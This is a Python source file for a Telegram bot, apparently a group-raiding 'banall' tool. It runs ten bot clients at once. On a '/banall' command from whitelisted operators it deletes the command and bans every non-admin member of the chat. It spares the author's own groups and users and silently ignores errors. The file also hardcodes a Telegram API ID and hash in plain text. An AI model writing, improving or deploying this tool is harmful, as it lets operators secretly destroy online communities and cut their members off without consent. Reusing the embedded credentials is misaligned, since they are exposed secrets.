import logging
from decouple import config
from os import getenv
from telethon import TelegramClient, events
from telethon.tl.types import ChatBannedRights, ChannelParticipantsAdmins
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.types import (
    ChannelParticipantsAdmins,
    ChatBannedRights,
)

BOT_TOKEN1 = config("BOT_TOKEN1", None)
BOT_TOKEN2 = config("BOT_TOKEN2", None)
BOT_TOKEN3 = config("BOT_TOKEN3", None)
BOT_TOKEN4 = config("BOT_TOKEN4", None)
BOT_TOKEN5 = config("BOT_TOKEN5", None)
BOT_TOKEN6 = config("BOT_TOKEN6", None)
BOT_TOKEN7 = config("BOT_TOKEN7", None)
BOT_TOKEN8 = config("BOT_TOKEN8", None)
BOT_TOKEN9 = config("BOT_TOKEN9", None)
BOT_TOKEN10 = config("BOT_TOKEN10", None)
SUDO_USERS = list(map(int, getenv("SUDO").split()))
AMS = [6204761408,6253372394]
ALTRONS = [-1001987535452, -1001544173381, -1001841879487]
SUDO_USERS.append(6204761408)

RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

logging.basicConfig(level=logging.INFO)
AM1 = TelegramClient('AM1', 12227067, "b463bedd791aa733ae2297e6520302fe").start(bot_token=BOT_TOKEN1)
AM2 = TelegramClient('AM2', 12227067, "b463bedd791aa733ae2297e6520302fe").start(bot_token=BOT_TOKEN2)
AM3 = TelegramClient('AM3', 12227067, "b463bedd791aa733ae2297e6520302fe").start(bot_token=BOT_TOKEN3)
AM4 = TelegramClient('AM4', 12227067, "b463bedd791aa733ae2297e6520302fe").start(bot_token=BOT_TOKEN4)
AM5 = TelegramClient('AM5', 12227067, "b463bedd791aa733ae2297e6520302fe").start(bot_token=BOT_TOKEN5)
AM6 = TelegramClient('AM6', 12227067, "b463bedd791aa733ae2297e6520302fe").start(bot_token=BOT_TOKEN6)
AM7 = TelegramClient('AM7', 12227067, "b463bedd791aa733ae2297e6520302fe").start(bot_token=BOT_TOKEN7)
AM8 = TelegramClient('AM8', 12227067, "b463bedd791aa733ae2297e6520302fe").start(bot_token=BOT_TOKEN8)
AM9 = TelegramClient('AM9', 12227067, "b463bedd791aa733ae2297e6520302fe").start(bot_token=BOT_TOKEN9)
AM10 = TelegramClient('AM10', 12227067, "b463bedd791aa733ae2297e6520302fe").start(bot_token=BOT_TOKEN10)


@AM1.on(events.NewMessage(pattern="^/banall"))
@AM2.on(events.NewMessage(pattern="^/banall"))
@AM3.on(events.NewMessage(pattern="^/banall"))
@AM4.on(events.NewMessage(pattern="^/banall"))
@AM5.on(events.NewMessage(pattern="^/banall"))
@AM6.on(events.NewMessage(pattern="^/banall"))
@AM7.on(events.NewMessage(pattern="^/banall"))
@AM8.on(events.NewMessage(pattern="^/banall"))
@AM9.on(events.NewMessage(pattern="^/banall"))
@AM10.on(events.NewMessage(pattern="^/banall"))
async def banall(event):
   if event.sender_id in SUDO_USERS:
        await event.delete()
        admins = await event.client.get_participants(event.chat_id, filter=ChannelParticipantsAdmins)
        admins_id = [i.id for i in admins]
        all = 0
        bann = 0
        if int(event.chat_id) in ALTRONS:
            return
        async for user in event.client.iter_participants(event.chat_id):
            all += 1
            try:
                if user.id not in admins_id and user.id not in AMS:
                    await event.client(EditBannedRequest(event.chat_id, user.id, RIGHTS))
                    bann += 1
            except Exception as e:
                pass


print("AMBOT Piro")

AM1.run_until_disconnected()
AM2.run_until_disconnected()
AM3.run_until_disconnected()
AM4.run_until_disconnected()
AM5.run_until_disconnected()
AM6.run_until_disconnected()
AM7.run_until_disconnected()
AM8.run_until_disconnected()
AM9.run_until_disconnected()
AM10.run_until_disconnected()
